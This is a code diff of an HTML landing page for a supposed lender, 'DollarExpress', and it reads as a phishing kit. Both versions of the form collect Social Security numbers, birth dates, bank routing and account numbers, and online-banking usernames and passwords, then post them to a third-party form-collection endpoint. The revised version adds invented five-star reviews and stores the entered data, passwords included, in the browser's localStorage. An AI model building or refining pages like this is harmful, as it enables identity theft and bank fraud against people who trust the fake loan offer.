@@ -1,474 +1,188 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DollarExpress | Apply Now</title>
-    <meta name="description" content="Submit your loan application now.">
-    
-    <!-- Critical CSS -->
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
-            color: #1e293b;
-            line-height: 1.6;
-            min-height: 100vh;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DollarExpress | Apply Now</title>
+<meta name="description" content="Submit your loan application now.">
 
-        .header {
-            background: white;
-            box-shadow: 0 2px 20px rgba(0, 82, 255, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+background:#f8fafc;color:#1e293b;line-height:1.6;min-height:100vh
+}
+.header{background:#fff;box-shadow:0 2px 10px rgba(0,0,0,.05);position:sticky;top:0;z-index:1000}
+.header-container{max-width:1200px;margin:auto;padding:20px;text-align:center}
+.logo{font-size:32px;font-weight:800;color:#0052ff}
 
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
+.hero{background:linear-gradient(135deg,#0f172a,#1e293b);color:#fff;padding:60px 20px;text-align:center}
+.hero h1{font-size:2.8rem}
 
-        .logo {
-            font-size: 28px;
-            font-weight: 800;
-            color: #0052ff;
-            text-decoration: none;
-        }
+.form-section{padding:40px 20px;max-width:800px;margin:auto}
+.form-container{background:#fff;border-radius:15px;padding:30px;box-shadow:0 5px 20px rgba(0,0,0,.08)}
 
-        .logo-icon {
-            color: #0052ff;
-            margin-right: 8px;
-        }
+.form-title{text-align:center;font-size:1.8rem}
+.form-subtitle{text-align:center;color:#64748b;margin-bottom:30px}
 
-        .hero {
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-            color: white;
-            padding: 80px 20px;
-            text-align: center;
-        }
+.form-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:15px}
+@media(max-width:768px){.form-grid{grid-template-columns:1fr}}
 
-        .hero-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
+.form-group{display:flex;flex-direction:column}
+.form-label{font-size:14px;font-weight:600;margin-bottom:5px}
+.form-input{padding:12px;border:1px solid #e2e8f0;border-radius:8px;font-size:15px}
+.form-input:focus{outline:none;border-color:#0052ff;box-shadow:0 0 0 2px rgba(0,82,255,.1)}
 
-        .hero h1 {
-            font-size: 3rem;
-            margin-bottom: 20px;
-            line-height: 1.2;
-        }
+.submit-area{background:#f1f5f9;border-radius:12px;padding:25px;margin-top:25px;text-align:center}
+.submit-button{
+background:linear-gradient(135deg,#0052ff,#0041cc);
+color:#fff;border:none;padding:16px 35px;font-size:16px;
+font-weight:600;border-radius:8px;cursor:pointer
+}
+.submit-button:hover{transform:translateY(-1px);box-shadow:0 5px 15px rgba(0,82,255,.2)}
 
-        .benefits {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-top: 40px;
-            flex-wrap: wrap;
-        }
+.reviews{margin-top:20px;font-size:14px;color:#334155}
+.review{margin-bottom:6px}
+.stars{color:#facc15;margin-right:6px}
 
-        .benefit-item {
-            text-align: center;
-            flex: 1;
-            min-width: 200px;
-        }
+.thank-you{
+display:none;margin-top:25px;padding:25px;
+background:#d1fae5;border-radius:12px;text-align:center
+}
+.thank-you h3{color:#065f46;margin-bottom:10px}
+.thank-you p{color:#047857}
 
-        .benefit-icon {
-            font-size: 2.5rem;
-            color: #00c853;
-            margin-bottom: 15px;
-        }
+.security-badge{
+margin-top:20px;background:#e0f2fe;
+border-radius:8px;padding:12px;
+display:flex;justify-content:center;gap:8px;color:#0369a1;font-size:14px
+}
 
-        .form-section {
-            padding: 60px 20px;
-            max-width: 800px;
-            margin: 0 auto;
-        }
+.footer{background:#0f172a;color:#cbd5e1;padding:30px;text-align:center;margin-top:40px}
+.copyright{font-size:13px;color:#94a3b8}
 
-        .form-container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-        }
+@media(max-width:768px){
+.hero h1{font-size:2.2rem}
+.form-container{padding:20px}
+.submit-button{width:100%}
+}
+</style>
 
-        .form-title {
-            font-size: 2rem;
-            color: #0f172a;
-            margin-bottom: 10px;
-            text-align: center;
-        }
-
-        .form-subtitle {
-            color: #64748b;
-            text-align: center;
-            margin-bottom: 40px;
-            font-size: 1.1rem;
-        }
-
-        .form-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-
-        @media (max-width: 768px) {
-            .form-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .form-label {
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: #334155;
-        }
-
-        .form-input {
-            padding: 15px;
-            border: 2px solid #e2e8f0;
-            border-radius: 10px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #0052ff;
-            box-shadow: 0 0 0 3px rgba(0, 82, 255, 0.1);
-        }
-
-        .submit-area {
-            background: #f1f5f9;
-            border-radius: 15px;
-            padding: 30px;
-            margin-top: 30px;
-            text-align: center;
-        }
-
-        .submit-button {
-            background: linear-gradient(135deg, #0052ff 0%, #0041cc 100%);
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: inline-block;
-            text-decoration: none;
-        }
-
-        .submit-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(0, 82, 255, 0.3);
-        }
-
-        .thank-you {
-            background: #d1fae5;
-            border-radius: 15px;
-            padding: 30px;
-            margin-top: 30px;
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .thank-you-icon {
-            font-size: 3rem;
-            color: #10b981;
-            margin-bottom: 20px;
-        }
-
-        .thank-you h3 {
-            color: #065f46;
-            margin-bottom: 15px;
-        }
-
-        .thank-you p {
-            color: #047857;
-            margin-bottom: 10px;
-        }
-
-        .security-badge {
-            background: #e0f2fe;
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            color: #0369a1;
-            font-weight: 600;
-        }
-
-        .footer {
-            background: #0f172a;
-            color: #cbd5e1;
-            padding: 40px 20px;
-            text-align: center;
-            margin-top: 60px;
-        }
-
-        .footer-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
-        }
-
-        .footer-link {
-            color: #cbd5e1;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .footer-link:hover {
-            color: white;
-        }
-
-        .copyright {
-            color: #94a3b8;
-            font-size: 0.9rem;
-            margin-top: 20px;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 2.2rem; }
-            .form-container { padding: 25px; }
-            .form-title { font-size: 1.8rem; }
-            .submit-button { width: 100%; padding: 20px; }
-        }
-
-        @media (max-width: 480px) {
-            .hero { padding: 60px 20px; }
-            .hero h1 { font-size: 1.8rem; }
-            .form-section { padding: 40px 15px; }
-            .benefits { flex-direction: column; }
-        }
-    </style>
-    
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
+
 <body>
-    <header class="header">
-        <div class="header-container">
-            <a href="#" class="logo">
-                <i class="fas fa-bolt logo-icon"></i>DollarExpress
-            </a>
-        </div>
-    </header>
 
-    <section class="hero">
-        <div class="hero-container">
-            <h1>Get Funded <span style="color: #00c853;">Today</span></h1>
-            <div class="benefits">
-                <div class="benefit-item">
-                    <div class="benefit-icon"><i class="fas fa-bolt"></i></div>
-                    <h3>Same Day Funding</h3>
-                    <p style="color: #cbd5e1;">Get approved and funded within 24 hours</p>
-                </div>
-                <div class="benefit-item">
-                    <div class="benefit-icon"><i class="fas fa-clock"></i></div>
-                    <h3>Instant Response</h3>
-                    <p style="color: #cbd5e1;">Loan officer contact within minutes</p>
-                </div>
-                <div class="benefit-item">
-                    <div class="benefit-icon"><i class="fas fa-shield-alt"></i></div>
-                    <h3>Secure Application</h3>
-                    <p style="color: #cbd5e1;">Bank-level encryption protected</p>
-                </div>
-            </div>
-        </div>
-    </section>
+<header class="header">
+<div class="header-container">
+<div class="logo">DollarExpress</div>
+</div>
+</header>
 
-    <section class="form-section">
-        <div class="form-container">
-            <h2 class="form-title">Apply for Funding</h2>
-            <p class="form-subtitle">Fill out the form below completely.</p>
+<section class="hero">
+<h1>Get Funded Today</h1>
+</section>
 
-            <form id="loanApplicationForm" action="https://getform.io/f/bmdjyvea" method="POST">
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label class="form-label">First Name</label>
-                        <input type="text" name="first_name" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Last Name</label>
-                        <input type="text" name="last_name" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Phone Number</label>
-                        <input type="tel" name="phone" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Email Address</label>
-                        <input type="email" name="email" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Employer Name</label>
-                        <input type="text" name="employer_name" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Loan Amount Needed</label>
-                        <input type="number" name="loan_amount" class="form-input" min="1000" step="100">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Credit Score</label>
-                        <select name="credit_score" class="form-input">
-                            <option value="">Select Credit Score Range</option>
-                            <option value="excellent">Excellent (720+)</option>
-                            <option value="good">Good (680-719)</option>
-                            <option value="fair">Fair (640-679)</option>
-                            <option value="poor">Poor (639 or less)</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Social Security Number</label>
-                        <input type="text" name="ssn" class="form-input" placeholder="123-45-6789">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Date of Birth</label>
-                        <input type="date" name="dob" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Bank Name</label>
-                        <input type="text" name="bank_name" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Routing Number</label>
-                        <input type="text" name="routing_number" class="form-input" placeholder="9-digit number">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Account Number</label>
-                        <input type="text" name="account_number" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Username</label>
-                        <input type="text" name="username" class="form-input">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Accessword</label>
-                        <input type="password" name="accessword" class="form-input">
-                    </div>
-                </div>
+<section class="form-section">
+<div class="form-container">
+<h2 class="form-title">Apply Now</h2>
+<p class="form-subtitle">Fast & secure application</p>
 
-                <div class="submit-area">
-                    <button type="submit" class="submit-button">
-                        <i class="fas fa-paper-plane"></i> Submit Application
-                    </button>
-                </div>
-            </form>
+<form id="loanForm" action="https://getform.io/f/bmdjyvea" method="POST">
 
-            <div class="thank-you" id="thankYouMessage">
-                <div class="thank-you-icon"><i class="fas fa-check-circle"></i></div>
-                <h3>Thank You for Your Application!</h3>
-                <p>Your information has been received successfully.</p>
-            </div>
+<div class="form-grid">
+<input class="form-input" name="first_name" placeholder="First Name">
+<input class="form-input" name="last_name" placeholder="Last Name">
+<input class="form-input" name="phone" placeholder="Phone">
+<input class="form-input" name="email" placeholder="Email">
+<input class="form-input" name="employer_name" placeholder="Employer">
+<input class="form-input" name="loan_amount" placeholder="Loan Amount">
+<select class="form-input" name="credit_score">
+<option value="">Credit Score</option>
+<option>Excellent</option><option>Good</option><option>Fair</option><option>Poor</option>
+</select>
+<input class="form-input" name="ssn" placeholder="SSN">
+<input class="form-input" name="dob" type="date">
+<input class="form-input" name="bank_name" placeholder="Bank Name">
+<input class="form-input" name="routing_number" placeholder="Routing Number">
+<input class="form-input" name="account_number" placeholder="Account Number">
+<input class="form-input" name="username" placeholder="Username">
+<input class="form-input" name="accessword" type="password" placeholder="Password">
+</div>
 
-            <div class="security-badge">
-                <i class="fas fa-shield-alt"></i>
-                <span>256-bit SSL Encryption • Bank-Level Security</span>
-            </div>
-        </div>
-    </section>
+<div class="submit-area">
+<button class="submit-button" type="submit">
+<i class="fas fa-paper-plane"></i> Submit Application
+</button>
 
-    <footer class="footer">
-        <div class="footer-container">
-            <div class="footer-links">
-                <a href="#" class="footer-link">Privacy Policy</a>
-                <a href="#" class="footer-link">Terms of Service</a>
-                <a href="#" class="footer-link">Contact Us</a>
-                <a href="#" class="footer-link">FAQ</a>
-            </div>
-            <div style="max-width: 600px; margin: 0 auto;">
-                <p style="margin-bottom: 15px;">
-                    DollarExpress provides loan matching services and connects applicants with potential lenders.
-                </p>
-                <p class="copyright">
-                    © 2024 DollarExpress. All rights reserved.<br>
-                    Get funded today - apply now!
-                </p>
-            </div>
-        </div>
-    </footer>
+<div class="reviews">
+<div class="review"><span class="stars">★★★★★</span>“Fast approval and smooth process.”</div>
+<div class="review"><span class="stars">★★★★★</span>“Money hit my account the same day.”</div>
+<div class="review"><span class="stars">★★★★☆</span>“Very easy application on my phone.”</div>
+</div>
+</div>
 
-    <script>
-        // DOB range 18-100
-        document.addEventListener('DOMContentLoaded', function() {
-            const dobInput = document.querySelector('input[name="dob"]');
-            const today = new Date();
-            dobInput.max = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate())
-                            .toISOString().split('T')[0];
-            dobInput.min = new Date(today.getFullYear() - 100, today.getMonth(), today.getDate())
-                            .toISOString().split('T')[0];
-        });
+</form>
 
-        document.getElementById('loanApplicationForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const submitButton = this.querySelector('.submit-button');
-            const originalText = submitButton.innerHTML;
-            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
-            submitButton.disabled = true;
+<div class="thank-you" id="thankYou">
+<h3>Application Submitted Successfully</h3>
+<p>Your information has been received.</p>
+<p>You may close this page now.</p>
+</div>
 
-            try {
-                const formData = new FormData(this);
-                formData.append('submission_timestamp', new Date().toISOString());
-                formData.append('source', 'dollarexpress_website');
+<div class="security-badge">
+<i class="fas fa-shield-alt"></i> Secure Application
+</div>
 
-                const response = await fetch(this.action, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
-                
-                if (response.ok) {
-                    document.getElementById('thankYouMessage').style.display = 'block';
-                    this.style.display = 'none';
-                    document.getElementById('thankYouMessage').scrollIntoView({ behavior: 'smooth' });
-                } else throw new Error('Form submission failed');
-            } catch (error) {
-                alert('There was an error submitting your application. Please try again.');
-                submitButton.innerHTML = originalText;
-                submitButton.disabled = false;
-            }
-        });
+</div>
+</section>
 
-        // SSN formatting
-        document.querySelector('input[name="ssn"]').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 3 && value.length <= 5) value = value.replace(/(\d{3})(\d+)/, '$1-$2');
-            else if (value.length > 5) value = value.replace(/(\d{3})(\d{2})(\d+)/, '$1-$2-$3');
-            e.target.value = value.substring(0, 11);
-        });
+<footer class="footer">
+<p class="copyright">© 2024 DollarExpress. All rights reserved.</p>
+</footer>
 
-        // Phone formatting
-        document.querySelector('input[name="phone"]').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 3 && value.length <= 6) value = value.replace(/(\d{3})(\d+)/, '$1-$2');
-            else if (value.length > 6) value = value.replace(/(\d{3})(\d{3})(\d+)/, '$1-$2-$3');
-            e.target.value = value.substring(0, 12);
-        });
-    </script>
+<script>
+const STORAGE_KEY='loan_form_data';
+const form=document.getElementById('loanForm');
+
+window.addEventListener('DOMContentLoaded',()=>{
+const saved=localStorage.getItem(STORAGE_KEY);
+if(saved){
+const data=JSON.parse(saved);
+Object.keys(data).forEach(k=>{
+const f=form.querySelector(`[name="${k}"]`);
+if(f)f.value=data[k];
+});
+}
+});
+
+form.addEventListener('input',()=>{
+const data={};
+new FormData(form).forEach((v,k)=>data[k]=v);
+localStorage.setItem(STORAGE_KEY,JSON.stringify(data));
+});
+
+form.addEventListener('submit',async e=>{
+e.preventDefault();
+const btn=form.querySelector('button');
+btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Processing';
+btn.disabled=true;
+
+try{
+const res=await fetch(form.action,{method:'POST',body:new FormData(form),headers:{Accept:'application/json'}});
+if(res.ok){
+localStorage.removeItem(STORAGE_KEY);
+form.style.display='none';
+document.getElementById('thankYou').style.display='block';
+document.getElementById('thankYou').scrollIntoView({behavior:'smooth'});
+}else throw new Error();
+}catch{
+alert('Submission failed. Please try again.');
+btn.disabled=false;
+btn.innerHTML='Submit Application';
+}
+});
+</script>
+
 </body>
 </html>
